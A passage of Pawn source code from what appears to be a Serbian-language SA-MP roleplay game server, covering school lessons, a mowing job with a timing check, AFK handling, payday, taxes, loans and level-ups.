		Novi_KillTimer( SkolaTimer[ playerid ] );
		PlayerInfo[ playerid ][ xSkolaLimit ] = 1;
		SendInfoMessage( playerid, "Polozio si %d deo (od mogucih 15) fakultet.", broj );
		TogglePlayerControllable( playerid, true );
		VremeTDControl( playerid, false );
	    format( globalstring, sizeof( globalstring ), "* %s ustaje sa stolice.", ImeIgraca( playerid ) );
		PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		ClearAnimations( playerid ); SavePlayer( playerid );
		SavePlayer( playerid );
	}
	return 1;
}
public SrednjaCasovi( playerid, broj ) {
	if( PlayerInfo[ playerid ][ xSrednja ] != 6 ) {
		PlayerInfo[ playerid ][ xSrednja ] = broj;
		Odbrojavanje[ playerid ] = 0; Uciskolu[ playerid ] = false;
		Novi_KillTimer( SkolaTimer[ playerid ] );
		PlayerInfo[ playerid ][ xSkolaLimit ] = 1;
		SendInfoMessage( playerid, "Polozio si %d deo (od mogucih 6) srednje skole. ", broj );
		TogglePlayerControllable( playerid, true );
		VremeTDControl( playerid, false );
	    format( globalstring, sizeof( globalstring ), "* %s ustaje sa stolice.", ImeIgraca( playerid ) );
		PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		ClearAnimations( playerid ); SavePlayer( playerid );
		SavePlayer( playerid );
	}
}
public OsnovnaCasovi( playerid, broj ) {
    if( PlayerInfo[ playerid ][ xOsnovna ] != 3 ) {
		PlayerInfo[ playerid ][ xOsnovna ] = broj;
		Odbrojavanje[ playerid ] = 0; Uciskolu[ playerid ] = false;
		Novi_KillTimer( SkolaTimer[ playerid ] );
		PlayerInfo[ playerid ][ xSkolaLimit ] = 1;
		TogglePlayerControllable( playerid, true );
		SendInfoMessage( playerid, "Polozio si %d deo (od mogucih 3) osnovne skole. ", broj );
		VremeTDControl( playerid, false );
	    format( globalstring, sizeof( globalstring ), "* %s ustaje sa stolice.", ImeIgraca( playerid ) );
		PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		ClearAnimations( playerid ); SavePlayer( playerid );
		SavePlayer( playerid );
	}
	return 1;
}
//------------------------------------------------------------------------------
PlayerPlayMusic( playerid )
{
	if( IsPlayerConnected( playerid ) )
	{
		SetTimer("StopMusic", 5000, 0);
		PlayerPlaySound( playerid, 1068, 0.0, 0.0, 0.0);
	}
}
public StopMusic()
{
	foreach( Player, i)
	{
		if( IsPlayerConnected(i))
		{
			PlayerPlaySound(i, 1069, 0.0, 0.0, 0.0);
		}
	}
}
//------------------------------------------------------------------------------
public TravaT( i ) {
	new Float:Pos[ 3 ];
    if( PlayerInfo[ i ][ xPosao ] == POSAO_KOSAC && KrenuoKosenje[ i ] && GetVehicleModel( GetPlayerVehicleID( i ) ) == 572 ) {
		for( new j = 0; j < 38; j++ ) {
			if( GrassID[ j ][ i ] == 804 ) {
				GetPlayerObjectPos( i, Grass[ j ][ i ], Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
				if( IsPlayerInRangeOfPoint( i, 2.0, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] ) ) {
				
				    if( PokosenaTrava[ i ] == 37 ) {
					    new time = gettime( );
						new ostatak = ( NovoVreme[ i ] - ( time - StaroVreme[ i ] ) );
						if( ( time - StaroVreme[ i ] ) < NovoVreme[ i ] ) {
							SendErrorMessage( i, "Zavrsili ste posao ranije nego sto je predvidjeno. " );
					    	SendErrorMessage( i, "Sacekajte jos %d sekundi i prodjite ponovo kroz objekt.", ostatak );
					    	format( globalstring, sizeof( globalstring ), "| V:AC | %s[ID: %d] je zavrsio kosaca pre vremena( za %d od %d sekundi ).", ImeIgraca( i ), i, (NovoVreme[ i ]-ostatak), NovoVreme[ i ] );
				    		AdminPoruka( ANTICHEAT, globalstring );
							return 1;
					    }
					}
					
					DestroyPlayerObject( i, Grass[ j ][ i ] );
					GrassID[ j ][ i ] = 19473;

					PokosenaTrava[ i ]++;
					break;
				}
			}
		}
		
		if( PokosenaTrava[ i ] == 38 ) {
            Novi_KillTimer( TravaTimer[ i ] );
			SCM(i, SVETLOPLAVA, "Pokosili ste svu travu.");
			PokosenaTrava[ i ] = 0;
			SetVehicleToRespawn( GetPlayerVehicleID( i ) );

            if(ServerInfo[HappyJob] == POSAO_KOSAC) {
                dajPlatuIgracu(i, PlataPosla[PLATA_KOSAC] * 2);
                SendInfoMessage(i, "Zbog srecnog posla dobio si duplu platu!");
            } 
            else dajPlatuIgracu(i, PlataPosla[PLATA_KOSAC]);

            BussinesJobMoney(POSAO_KOSAC, POSAO_KOSAC/2);

			SavePlayer( i );
			SendJobMessage( i, "Zaradili ste "col_white"%d$ "col_job"koji su vam legli na platni racun.", PlataPosla[PLATA_KOSAC]);
			KrenuoKosenje[ i ] = false;
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
AFKCheck( playerid ) {
    GetPlayerPos(playerid, antiCheatCS[ playerid ][ AFKSecondPos ][ 0 ], antiCheatCS[ playerid ][ AFKSecondPos ][ 1 ], antiCheatCS[ playerid ][ AFKSecondPos ][ 2 ] );

    if( !floatcmp( antiCheatCS[ playerid ][ AFKSecondPos ][ 0 ], antiCheatCS[ playerid ][ AFKFirstPos ][ 0 ] ) && !floatcmp( antiCheatCS[ playerid ][ AFKSecondPos ][ 1 ], antiCheatCS[ playerid ][ AFKFirstPos ][ 1 ] ) ) {
	    if( PlayerInfo[ playerid ][ xRPLearn ] == 0 && PlayerInfo[ playerid ][ xAdmin ] != 7 ) {
			antiCheatCS[ playerid ][ AFKMinute ]++;
		}
	}
	else {
        antiCheatCS[ playerid ][ AFKMinute ] = 0;
	}
	
 	antiCheatCS[ playerid ][ AFKFirstPos ][ 0 ] = antiCheatCS[ playerid ][ AFKSecondPos ][ 0 ];
	antiCheatCS[ playerid ][ AFKFirstPos ][ 1 ] = antiCheatCS[ playerid ][ AFKSecondPos ][ 1 ];
	antiCheatCS[ playerid ][ AFKFirstPos ][ 2 ] = antiCheatCS[ playerid ][ AFKSecondPos ][ 2 ];

    if( antiCheatCS[ playerid][ AFKMinute ] >= 2 && PlayerInfo[playerid][xAdmin] >= 1 && PlayerInfo[playerid][xAdmin] < 7 && AdminDuty[playerid]) {

        PostaviSkin(playerid,PlayerInfo[ playerid ][ xSkin ]);
        SetPlayerColor( playerid, 0xFFFFFF00 );
        
        AdminDuty[playerid] = false;
        va_SendClientMessageToAll(-1, ""col_white"Admin "SRVBOJA1SCM"%s(Duty: %d min)"col_white" je sada van duznosti", ImeIgraca(playerid), PlayerInfo[playerid][xAdminDuty]);

        SendInfoMessage(playerid, "Bio si AFK duze od 2 minuta, skinut ti je duty!");
    }

    if( antiCheatCS[ playerid][ AFKMinute ] >= 2 && PlayerInfo[playerid][xSupporter] >= 1 && AdminDuty[playerid]) {

        SetPlayerColor( playerid, 0xFFFFFF00 );
        Novi_SetPlayerHealth( playerid, 40);
        Novi_SetPlayerArmour( playerid, 0);
        //PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        
        AdminDuty[ playerid ] = false;

        SendInfoMessage(playerid, "Bio si AFK duze od 2 minuta, skinut ti je duty!");

        format( globalstring, sizeof( globalstring ), "Helper %s(Duty: %d min) vise nije na duznosti.", ImeIgraca( playerid ), PlayerInfo[playerid][xAdminDuty] );
        RPTChat( SUPPORTER, globalstring );
    }

    if( antiCheatCS[ playerid][ AFKMinute ] >= 2 && PoliceDuty[playerid]) {

        PoliceDuty[ playerid ] = false;
        ResetAllWeapons( playerid );
        Novi_SetPlayerArmour( playerid, 0 );
        BrojLisica[ playerid ] = 0;
        Novi_SetPlayerArmour( playerid, 0 );
        Novi_SetPlayerHealth( playerid, 75 );
        PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        
        SetPlayerColor( playerid, 0xFFFFFF00 );
        SendInfoMessage(playerid, "Bio si AFK duze od 2 minuta, skinut ti je duty!");
    }


	if( antiCheatCS[ playerid ][ AFKMinute ] >= 30 && PlayerInfo[ playerid ][ xZatvor ] == 0 ) {
	
	    if( PlayerInfo[ playerid ][ xWanted ] > 0 ) {
	    
			PlayerInfo[ playerid ][ xZatvor ] = OBICAN_ZATVOR;
			PlayerInfo[ playerid ][ xZatvorVreme ] = 6*PlayerInfo[ playerid ][ xWanted ];
			new price = PlayerInfo[ playerid ][ xWanted ]*500;
			DajIgracuNovac( playerid, -price );

            SendInfoMessage( playerid, "Bili ste afk sa WL I otisli ste u zatvor." );
			
			new rand = random( sizeof( RandomZatvor ) );
			PortajIgraca( playerid, RandomZatvor[ rand ][ 0 ], RandomZatvor[ rand ][ 1 ],RandomZatvor[ rand ][ 2 ] );
			PlayerInfo[ playerid ][ xWanted ] = 0;
            SetPlayerWorldBounds(playerid, -1398.697143, -1472.672607, -1443.334228, -1605.534057);
			Novi_SetPlayerWantedLevel( playerid, PlayerInfo[ playerid ][ xWanted ] );
			strmid( ZlocinInfo[ playerid ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
			strmid( ZlocinInfo[ playerid ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
			strmid( ZlocinInfo[ playerid ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
            GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
		    SetCameraBehindPlayer( playerid ); SetPlayerInterior( playerid, 0);
		    SetPlayerVirtualWorld( playerid, 0);
		    TogglePlayerControllable( playerid, 0 );
			SavePlayer( playerid );
	    }
	    else if( PlayerInfo[ playerid ][ xWanted ] == 0 ) {
	
		    SendInfoMessage( playerid, "Bili ste duze od 10 minuta afk.Prebaceni ste u afk zonu." );

		    antiCheatCS[ playerid ][ TeleportCheck ] = 4;

			if( NaDmEventu[ playerid ] == true ) {
			    NaDmEventu[ playerid ] = false;
			    ResetAllWeapons( playerid );
			}

		    new rand = random( sizeof( RandomAFKZone ) );
			Novi_SetPlayerPos( playerid, RandomAFKZone[ rand ][ 0 ], RandomAFKZone[ rand ][ 1 ], RandomAFKZone[ rand ][ 2 ] );
			SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
			GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
			TogglePlayerControllable( playerid, false );
			SetCameraBehindPlayer( playerid );
			SetPlayerInterior( playerid, 18 );
			SetPlayerVirtualWorld( playerid, 0 );
		}
	}
}
//------------------------------------------------------------------------------

public PayDay( playerid ) {

    if( PlayerLogged[ playerid ] == true ) {
    
	    new stariiznos = PlayerInfo[ playerid ][ xBRacun ];
	    
	    new donatorkamata = 0, platapd = 0, plataadms = 0, plataprom = 0;
	    
	    PlayerInfo[ playerid ][ xRespekt ]++;
	    PlayerInfo[ playerid ][ xOnlineSati ]++;
	    PlayerInfo[ playerid ][ xPayDay ] = 0;
	    PlayerInfo[ playerid ][ xSkolaLimit ] = 0;
	    PlayerInfo[ playerid ][ xLesLimit ] = 0;

		if( PlayerInfo[ playerid ][ xNovac ] < 0 ) {
		    if( PlayerInfo[ playerid ][ xZatvor ] == 0 ) {
			    SCM( playerid, 0xFF6347AA, "Niste platili vas dug, vreme je za zatvor(5 min)." );

			    ResetAllWeapons( playerid );

			    PlayerInfo[ playerid ][ xZatvor ] = OBICAN_ZATVOR;
				PlayerInfo[ playerid ][ xZatvorVreme ] = 5;

			    new rand = random( sizeof( RandomZatvor ) );
				PortajIgraca( playerid, RandomZatvor[ rand ][ 0 ], RandomZatvor[ rand ][ 1 ], RandomZatvor[ rand ][ 2 ] );
                SetPlayerWorldBounds(playerid, -1398.697143, -1472.672607, -1443.334228, -1605.534057);
				SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
				GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
				TogglePlayerControllable( playerid, false );
				SetCameraBehindPlayer( playerid );
				SetPlayerInterior( playerid, 0 );
				SetPlayerVirtualWorld( playerid, 0 );
			}
		}

        if( GetFactionType( playerid ) == ORG_TIP_PD ) {
            if(PoliceDuty[playerid]) {
                if(PlayerInfo[playerid][xClan] == 1)
				    platapd = 1500;
                else if(PlayerInfo[playerid][xClan] == 2)
                    platapd = 2000;
                else if(PlayerInfo[playerid][xClan] == 3)
                    platapd = 3000;
                else if(PlayerInfo[playerid][xClan] == 4)
                    platapd = 3500;
                else if(PlayerInfo[playerid][xClan] == 5)
                    platapd = 4000;
			}
		}

        if( PlayerInfo[ playerid ][ xPromoter ] > 0 ) {
            if( antiCheatCS[ playerid ][ AFKMinute ] == 0 && !IsPlayerPaused( playerid ) ) {
				plataprom = 500;
			}
		}

        if( PlayerInfo[ playerid ][ xSupporter ] > 0 ) {
            if( antiCheatCS[ playerid ][ AFKMinute ] < 2 && !IsPlayerPaused( playerid ) ) {
				plataadms = 2000+(PlayerInfo[ playerid ][ xSupporter ]*200);
			}
		}
		
		if( PlayerInfo[ playerid ][ xAdmin ] > 0 ) {
            if( antiCheatCS[ playerid ][ AFKMinute ] < 2 && !IsPlayerPaused( playerid ) ) {
				plataadms = 2200+(PlayerInfo[ playerid ][ xAdmin ]*200);
			}
		}

        if( PlayerInfo[ playerid ][ xRentID ] != -1 ) {
            new id = PlayerInfo[ playerid ][ xRentID ];
            if( II[ id ][ iRentable ] == 1 ) {
	            if( II[ id ][ iRentPrice ] > PlayerInfo[ playerid ][ xNovac ] ) {

	                II[ id ][ iRentovano ]--;
	                SaveProperty( id );

				    PlayerInfo[ playerid ][ xRentID ] = -1;
				    PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
				    SendClientMessageEx( playerid, ZUTA, "Niste imali dovoljno novca za rent, izbaceni ste." );
	            }
	            else {
	                II[ id ][ iMoney ] += II[ id ][ iRentPrice ];
	                SaveProperty( id );

	                DajIgracuNovac( playerid, -II[ id ][ iRentPrice ] );
	                SendClientMessageEx( playerid, ZUTA, "Platili ste rent %d$.", II[ id ][ iRentPrice ] );
	            }
			}
			else if( II[ id ][ iRentable ] == 0 ) {
			    II[ id ][ iRentovano ]--;
	            SaveProperty( id );

			    PlayerInfo[ playerid ][ xRentID ] = -1;
			    PlayerInfo[ playerid ][ xSpawn ] = SPAWN_OBICAN_LS_1;
			    
			    SendClientMessageEx( playerid, ZUTA, "Kuca koju ste rentali vise nije na iznajmljivanje." );
			}
        }

        if( ServerInfo[ HappyHours ] == true ) PlayerInfo[ playerid ][ xRespekt ]++;

	    if( PlayerInfo[ playerid ][ xIznosRate ] > 0 &&
			PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] > 0 &&
			PlayerInfo[ playerid ][ xIznosKredita ] > 0 )
		{
		    if( PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] < PlayerInfo[ playerid ][ xIznosRate ] ) {
		        PlayerInfo[ playerid ][ xIznosRate ] = PlayerInfo[ playerid ][ xPreostaloZaOtplatu ];
			}
		    PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] -= PlayerInfo[ playerid ][ xIznosRate ];
		    PlayerInfo[ playerid ][ xBRacun ] -= PlayerInfo[ playerid ][ xIznosRate ];
		    if( PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] < 0 ) PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = 0;
		    if( PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] <= 0 ) { PlayerInfo[ playerid ][ xIznosKredita ] = 0; PlayerInfo[ playerid ][ xIznosRate ] = 0; }
		}

        if( PlayerInfo[ playerid ][ xHotelRoom ] != -1 ) {
            new hid = PlayerInfo[ playerid ][ xHotelRoom ];
            hotelInfo[ hid ][ hMoney ] += (hotelInfo[ hid ][ hRoomPrice ]/2);
            DajIgracuNovac( playerid, -hotelInfo[ hid ][ hRoomPrice ] );
            SaveHotel( hid );
            SendClientMessageEx( playerid, -1, "Platili ste %d$ cenu najma.", hotelInfo[ hid ][ hRoomPrice ] );
        }

	    new iznosplate = 0, osnova = 0, prihod = 0, rashod = 0, struja = 0, voda = 0, smece = 0, grijanje = 0, porez = 0, stecaj = 0;
		osnova = 45 + random( 5 );
		iznosplate = ((osnova*PlayerInfo[ playerid ][ xLevel ])+PlayerInfo[ playerid ][ xPlatniRacun ]);
		

		if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 ) {
		    new imovina = PlayerInfo[ playerid ][ xProperty ][ 0 ];
		    if( II[ imovina ][ iUsage ] == IMOVINA_KUCA ) {
	  			if( II[ imovina ][ iVrsta ] == MALA_KUCA ) { porez += 300; }
				else if( II[ imovina ][ iVrsta ] == SREDNJA_KUCA ) { porez += 500; }
				else if( II[ imovina ][ iVrsta ] == VELIKA_KUCA ) { porez += 650; }
				else if( II[ imovina ][ iVrsta ] == PENTHOUSE_KUCA ) { porez += 900; }
			}
			else if( II[ imovina ][ iUsage ] == IMOVINA_STAN ) { porez += 150; }
			else if( II[ imovina ][ iUsage ] == IMOVINA_VIKENDICA ) { porez += 400; }
			struja += (3 + random(5)); voda += (5 + random(5)); smece += 5; grijanje += 5;
			donatorkamata = 2;
			
			if( PlayerInfo[ playerid ][ xVIPLevel ] >= 4 ) {
			    donatorkamata = 4;
			}
			
			if( PlayerInfo[ playerid ][ xVIPLevel ] >= 5 ) {
            	donatorkamata = 5;
			}

	        if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
	            donatorkamata = 5;
			}

		}
		
		if( PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 ) {
		    new imovina = PlayerInfo[ playerid ][ xProperty ][ 1 ];
		    if( II[ imovina ][ iUsage ] == IMOVINA_KUCA ) {
	  			if( II[ imovina ][ iVrsta ] == MALA_KUCA ) { porez += 300; }
				else if( II[ imovina ][ iVrsta ] == SREDNJA_KUCA ) { porez += 500; }
				else if( II[ imovina ][ iVrsta ] == VELIKA_KUCA ) { porez += 650; }
				else if( II[ imovina ][ iVrsta ] == PENTHOUSE_KUCA ) { porez += 900; }
			}
			else if( II[ imovina ][ iUsage ] == IMOVINA_STAN ) { porez += 150; }
			else if( II[ imovina ][ iUsage ] == IMOVINA_VIKENDICA ) { porez += 400; }
			struja += (3 + random(5)); voda += (5 + random(5)); smece += 5; grijanje += 5;
			donatorkamata = 2;
			
			if( PlayerInfo[ playerid ][ xVIPLevel ] >= 4 ) {
			    donatorkamata = 4;
			}
			
			if( PlayerInfo[ playerid ][ xVIPLevel ] >= 5 ) {
            	donatorkamata = 5;
			}

	        if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
	            donatorkamata = 5;
			}

		}
		
		if( PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 ) {
		    new imovina = PlayerInfo[ playerid ][ xProperty ][ 2 ];
		    if( II[ imovina ][ iUsage ] == IMOVINA_KUCA ) {
	  			if( II[ imovina ][ iVrsta ] == MALA_KUCA ) { porez += 300; }
				else if( II[ imovina ][ iVrsta ] == SREDNJA_KUCA ) { porez += 500; }
				else if( II[ imovina ][ iVrsta ] == VELIKA_KUCA ) { porez += 650; }
				else if( II[ imovina ][ iVrsta ] == PENTHOUSE_KUCA ) { porez += 900; }
			}
			else if( II[ imovina ][ iUsage ] == IMOVINA_STAN ) { porez += 150; }
			else if( II[ imovina ][ iUsage ] == IMOVINA_VIKENDICA ) { porez += 400; }
			struja += (3 + random(5)); voda += (5 + random(5)); smece += 5; grijanje += 5;
			donatorkamata = 2;
			
			if( PlayerInfo[ playerid ][ xVIPLevel ] >= 4 ) {
			    donatorkamata = 4;
			}
			
			if( PlayerInfo[ playerid ][ xVIPLevel ] >= 5 ) {
            	donatorkamata = 5;
			}

	        if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
	            donatorkamata = 5;
			}

		}
		
		if( PlayerInfo[ playerid ][ xVIPLevel ] >= 5 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
			PlayerInfo[ playerid ][ xRespekt ]++;
		}

		if( PlayerInfo[ playerid ][ xFirmaID ] != -1 ) { porez += 50; }

		if( donatorkamata != 0 ) {
		    if( PlayerInfo[ playerid ][ xBRacun ] >= 100000 && PlayerInfo[ playerid ][ xBRacun ] <= 4000000 ) {
		    	stecaj = ( PlayerInfo[ playerid ][ xBRacun ]/1000 ) * donatorkamata;
			}
		}

	    new strp1[ 300 ], strp2[ 300 ], strp[ 600 ];

        prihod = iznosplate + stecaj + platapd + plataadms + plataprom;
		rashod = struja + voda + porez + smece + grijanje;
		PlayerInfo[ playerid ][ xBRacun ] += prihod;
		PlayerInfo[ playerid ][ xBRacun ] -= rashod;
		PlayerInfo[ playerid ][ xPlatniRacun ] = 0;

	    format( strp1, sizeof( strp1 ), "Banka Los Santos | Plata je stigla na vas racun\n\nPlata: %d$\nSteceni interes: %d$\n\nKredit Informacije\nIznos kredita: %d$\nIznos rate: %d$\nZa otplatu: %d%\n\n", (iznosplate+platapd+plataadms+plataprom), stecaj, PlayerInfo[ playerid ][ xIznosKredita ], PlayerInfo[ playerid ][ xIznosRate ], PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] );
        format( strp2, sizeof( strp2 ), "Platili ste\nPorez na imovinu: %d$\nStruja: %d$\nVoda: %d$\nSmece: %d$\nGrejanje: %d$\n\nStari iznos: %d$\nNovi iznos: %d$", porez, struja, voda, smece, grijanje, stariiznos, PlayerInfo[ playerid ][ xBRacun ] );

	    format( strp, sizeof( strp ), "%s%s", strp1, strp2);
		SPD( playerid, dialog_PAYDAY, DSMSG, D_NASLOV, strp, D_ODABERI, "" );

	    SCM( playerid, ZUTA, "Plata je stigla na vas bankovni racun!" );

	    if( PlayerInfo[ playerid ][ xPosao ] > 0 ) PlayerInfo[ playerid ][ xUgovor ] += 1;

		if( PlayerInfo[ playerid ][ xClan ] != 0 ) PlayerInfo[ playerid ][ xOrgUgovor ]++;

        if( PlayerInfo[ playerid ][ xKazneniUgovor ] != 0 ) PlayerInfo[ playerid ][ xKazneniUgovor ]--;

		if( PlayerInfo[ playerid ][ xBRacun ] <= -200000 ) {
		    if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 ) {
		        new imovina = PlayerInfo[ playerid ][ xProperty ][ 0 ];
		        II[ imovina ][ iLevel ] = 99;
		        II[ imovina ][ iOwned ] = 0;
                II[ imovina ][ iNeaktivnost ] = 0;
				strmid( II[ imovina ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
				PropertyRefresh( imovina );
				SaveProperty( imovina );
				PlayerInfo[ playerid ][ xProperty ][ 0 ] = -1;
			}
		    if( PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 ) {
		        new imovina = PlayerInfo[ playerid ][ xProperty ][ 1 ];
		        II[ imovina ][ iLevel ] = 99;
		        II[ imovina ][ iOwned ] = 0;
                II[ imovina ][ iNeaktivnost ] = 0;
				strmid( II[ imovina ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
				PropertyRefresh( imovina );
				SaveProperty( imovina );
				PlayerInfo[ playerid ][ xProperty ][ 1 ] = -1;
			}
		    if( PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 ) {
		        new imovina = PlayerInfo[ playerid ][ xProperty ][ 2 ];
		        II[ imovina ][ iLevel ] = 99;
		        II[ imovina ][ iOwned ] = 0;
                II[ imovina ][ iNeaktivnost ] = 0;
				strmid( II[ imovina ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
				PropertyRefresh( imovina );
				SaveProperty( imovina );
				PlayerInfo[ playerid ][ xProperty ][ 2 ] = -1;
			}
		    SCM( playerid, ZUTA, "Zbog neizmirenih dugova u banci(-200.000$), oduzeta vam je sva imovina!" );
		}
       	
       	new nxtlevel = PlayerInfo[ playerid ][ xLevel ]+1;
		new expamount = nxtlevel*levelexp;
		if( PlayerInfo[ playerid ][ xRespekt ] >= expamount ) {
			format( globalstring, sizeof( globalstring ), "~g~LEVEL UP~n~~w~Sada si Level %d", nxtlevel );
			GameTextForPlayer( playerid, globalstring, 5000, 1);
			PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
			PlayerPlayMusic( playerid );
			PlayerInfo[ playerid ][ xLevel ]++;
			SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
			PlayerInfo[ playerid ][ xPoboljsanja ] += 2;
            PlayerInfo[ playerid ][ xRespekt ] = 0; 
            dajSkillPoen(playerid, 1);
			// format( globalstring, sizeof( globalstring ), "Sada si level %d ukucaj /upgrade za neke bonuse", nxtlevel );
			// SCM( playerid, SVETLOPLAVA, globalstring);
			// format( globalstring, sizeof( globalstring ), "Imas %d neiskoristenih Upgrade Poena", PlayerInfo[ playerid ][ xPoboljsanja ] );
			// SCM( playerid, BELA, globalstring);
		}

		AktivnaIgra[playerid]++;
		switch(AktivnaIgra[playerid]) {

			case 5: {

				SendInfoMessage(playerid, "Bio si 5 sati za redom na serveru i dobio si 8.000$");
				DajIgracuNovac(playerid, 8000);
			}

			case 10: {

				SendInfoMessage(playerid, "Bio si 10 sati za redom na serveru i dobio si 15.000$");
				DajIgracuNovac(playerid, 15000);
			}

			case 20: {

				SendInfoMessage(playerid, "Bio si 20 sati za redom na serveru i dobio si LevelUP i 20.000$!");
				PlayerInfo[playerid][xLevel]++;
                dajSkillPoen(playerid, 1);
				DajIgracuNovac(playerid, 20000);
			}
		}
		
		SavePlayer( playerid );
        SetPlayerScore(playerid, PlayerInfo[playerid][xLevel]);
       	UpdateBankTD( playerid );
       	

	}
	return 1;
}
//------------------------------------------------------------------------------
public PayCheck( playerid ) {
	if( PlayerLogged[ playerid ] == true ) {

		PlayerInfo[ playerid ][ xPayDay ] += 1;

        // updateDoPlateTD(playerid);

        if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) PlayerInfo[ playerid ][ xStaffMin ]++;

        if( PlayerInfo[ playerid ][ xSupporter ] >= 1  ) PlayerInfo[ playerid ][ xStaffMin ]++;

        VremeZaCuvanje[ playerid ]++;
        if( VremeZaCuvanje[ playerid ] == 30 ) {
        	VremeZaCuvanje[ playerid ] = 0;
        	SavePlayer( playerid );
		}

        if( PlayerInfo[ playerid ][ xPayDay ] == 30) {
            if( PlayerInfo[ playerid ][ xHeroinAddict ] == true ) {
			    if( PlayerInfo[ playerid ][ xHeroinUsed ] > 0)
	            	PlayerInfo[ playerid ][ xHeroinUsed ] -= 1;
	        }
			else {
			    if( PlayerInfo[ playerid ][ xHeroinIndicator ] > 0)
			    	PlayerInfo[ playerid ][ xHeroinIndicator ] -= 10;
			}
			if( PlayerInfo[ playerid ][ xMethAddict ] == true ) {
			    if( PlayerInfo[ playerid ][ xMethUsed ] > 0)
	            	PlayerInfo[ playerid ][ xMethUsed ] -= 1;
	        }
			else {
			    if(PlayerInfo[ playerid ][ xMethIndicator ] > 0 )
			    	PlayerInfo[ playerid ][ xMethIndicator ] -= 10;
			}
			if( PlayerInfo[ playerid ][ xCokeCrackAddict ] == true ) {
			    if( PlayerInfo[ playerid ][ xCokeCrackUsed ] > 0 )
	            	PlayerInfo[ playerid ][ xCokeCrackUsed ] -= 1;
	        }
			else {
			    if( PlayerInfo[ playerid ][ xCokeCrackIndicator ] > 0)
			    	PlayerInfo[ playerid ][ xCokeCrackIndicator ] -= 10;
			}
        }

		if( PlayerInfo[ playerid ][ xPayDay ] >= 60 ) {
			PayDay( playerid );
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
getPosBehindVehicle( vehicleid, &Float:x, &Float:y, &Float:z, Float:offset = 0.5)
{
	if( vehicleid == INVALID_VEHICLE_ID) return;

    new
		Float:vehicleSize[ 3 ],
		Float:vehiclePos[ 3 ];

    GetVehiclePos( vehicleid, vehiclePos[0], vehiclePos[1], vehiclePos[2] );
    GetVehicleModelInfo(GetVehicleModel( vehicleid), VEHICLE_MODEL_INFO_SIZE, vehicleSize[0], vehicleSize[1], vehicleSize[2] );
    getXYBehindVehicle( vehicleid, vehiclePos[0], vehiclePos[1], (vehicleSize[1]/2)+offset);

    x = vehiclePos[0];
    y = vehiclePos[1];
    z = vehiclePos[2];
    return;
}
getXYBehindVehicle( vehicleid, &Float:q, &Float:w, Float:distance )
{
    new Float:a;
    GetVehiclePos( vehicleid, q, w, a);
    GetVehicleZAngle( vehicleid, a);
    q += (distance * -floatsin(-a, degrees));
    w += (distance * -floatcos(-a, degrees));
	return;
}

stock getPlayerNearestVehicle( playerid ) {
	static
	    Float:fX,
	    Float:fY,
	    Float:fZ;

	for (new i = 1; i != MAX_VEHICLES; i ++) if(IsValidVehicle(i) && GetVehiclePos(i, fX, fY, fZ))
	{
	    if( IsPlayerInRangeOfPoint( playerid, 10.0, fX, fY, fZ)) return i;
	}
	return INVALID_VEHICLE_ID;
}
stock getPlayerNearestTractor( playerid ) {
	static
	    Float:fX,
	    Float:fY,
	    Float:fZ;

	for (new i = 1; i != MAX_VEHICLES; i ++) if( IsValidVehicle( i ) && GetVehiclePos( i, fX, fY, fZ ) )
	{
	    if( IsPlayerInRangeOfPoint( playerid, 5.0, fX, fY, fZ ) ) return i;
	}
	return INVALID_VEHICLE_ID;
}

stock getPlayerNearestPizzaVehicle( playerid ) {
	static
	    Float:fX,
	    Float:fY,
	    Float:fZ;

	for (new i = 1; i != MAX_VEHICLES; i ++) if(IsValidVehicle(i) && GetVehiclePos(i, fX, fY, fZ))
	{
	    if( IsPlayerInRangeOfPoint( playerid, 2.0, fX, fY, fZ)) return i;
	}
	return INVALID_VEHICLE_ID;
}
//------------------------------------------------------------------------------
forward FarmerCows( playerid, id );
public FarmerCows( playerid, id ) {

	if( id < 14 ) {
	    TogglePlayerControllable( playerid, true );
	    ClearAnimations( playerid );
	    DestroyPlayerObject( playerid, farmerInfo[ playerid ][ fiBucketObject ] );
	    SetPlayerAttachedObject( playerid, OBJECT_NOSI, 2613, 1, -0.200000, 1.000000, -0.699999, -9.000000, 90.000000, -21.000000);
